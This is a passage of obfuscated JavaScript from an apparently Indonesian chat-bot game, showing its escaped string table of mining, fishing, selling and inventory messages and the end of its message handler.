🟢\x20Chiltawa\x20Woods\x0a🟠\x20Limingstall\x20Mountains\x0a🔴\x20Chade\x20Mountain\x0a\x0aExample\x20:\x0a-\x20','nambang','*Jumlah\x20Batu\x20dijual:*\x20','\x20kayu\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20kayu','*\x20kayu','170oSweCb','moobiens\x20grassland','\x0a❄️\x20*COPPER\x20ORE*\x20:\x20','*Jumlah\x20bahankimia\x20Yang\x20didapatkan\x20_','uranus','2244990dfCIBj','adventure','Xp\x20untuk\x20anda','jualikan','https://telegra.ph/file/19a10ff95c31af10267e4.jpg','inventory','lebur','chade\x20mountain','251834fikTHx','https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg','karena\x20anda\x20owner\x20kami\x20dari\x20team\x20bot\x20mengirim\x20','action','*\x20batu\x20,\x20*','Sedang\x20bertualang,\x20silahkan\x20tunggu...\x202\x20tahun','length','gger','211EsjgsU','*Sisa\x20Ingot:*\x20','*Sisa\x20Kayu\x20:*\x20','Cek\x20inventory\x20anda\x20dengan\x20cara\x20ketik\x20','*\x20coal\x20,\x20dan\x20*','*\x20copper\x20ore\x20dan\x20','debu','Kumpulkan\x20uang\x20untuk\x20membeli\x20limit','jualkayu','*kayu\x20selama\x202\x20menit','Error\x20','*Sisa\x20uang:*\x20','\x20ikan\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20ikan','\x20event\x20mining\x20tidak\x20di\x20aktifkan\x20oleh\x20owner','6qOUoVY','\x20kamu\x20tidak\x20punya\x20bahankimia','cochher\x20sea','https://telegra.ph/file/eabfc907cfc447386b0c0.jpg','*Sisa\x20ikan:*\x20','nebang','\x20kamu\x20mendapatkan\x20*','random','3207285EzHuOC','\x0a🐬\x20*FISH*\x20:\x20','7406tpRHpl','Limit\x20kamu\x20sudah\x20habis\x20silahkan\x20kirim\x20','Kamu\x20KALAH!!','jupiter','Mua\x20taruhan\x20berapa?','\x0a🛑\x20*STONE*\x20:\x20','*Jumlah\x20ikan\x20dijual:*\x20','*Congratulation\x20🎊*','get','Event\x20grub\x20belum\x20di\x20aktifkan','*Congratulation\x20🎊*\x0a\x0a\x20kamu\x20mendapatkan\x20*','*Uang\x20didapat:*\x20','jualcoal','maaf\x20','61734rRJrsf','chiltawa\x20woods','slice','inv','Mau\x20taruhan\x20berapa','Menunggu\x20hasil!.','*Jumlah\x20Coal\x20dijual:*\x20','Kamu\x20MENANG!!','Kamu\x20kalah\x20🥺\x20dan\x20kehilangan\x20uang\x20sebesar\x20','\x0a\x0a*Sisa\x20Ore:*\x20','*\x20selama\x202\x20tahun','mars','1385416sRCklZ','neptunus','*Jumlah\x20Ingot\x20dijual:*\x20','Sedang\x20Memancing,\x20silahkan\x20tunggu...','string','constructor','mancing','Penjualan\x20berhasil\x20dengan\x20nomor\x20pembayaran\x20d88288bak1920kal','RESPONSE','sendMessage','venus','tas','*「\x20PENJUALAN\x20BERHASIL\x20\x20」*','My\x20Inventory\x20🗃️','Maaf\x20','https://telegra.ph/file/efdcd7d07dd22294695a8.jpg','\x0a🌐\x20*WOOD*\x20:\x20','*Sisa\x20Batu:*\x20','jelajah','ceil','Proses\x20berhasil\x20dengan\x20nomer\x20pembayaran\x20d88288bak1920kal','mining','\x20ingot\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20ingot','_\x20adalah:*\x0a\x0a*_','\x0a\x0aSilahkan\x20bermain\x20game\x20untuk\x20mendapatkan\x20lebih\x20banyak\x20inventory','*Jumlah\x20bahankimia\x20dijual:*\x20','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','test','*Sisa\x20bahankimia:*\x20','sisabahankimia','4905984oJXpEV','\x20ore\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20ore','floor','https://telegra.ph/file/16857796fab2ccb6cffc2.jpg'];_0x50c4=function(){return _0x46f5d9;};return _0x50c4();}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[ PRIVATE ]', 'aqua'), 'SELF-MODE', color(pushname))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}
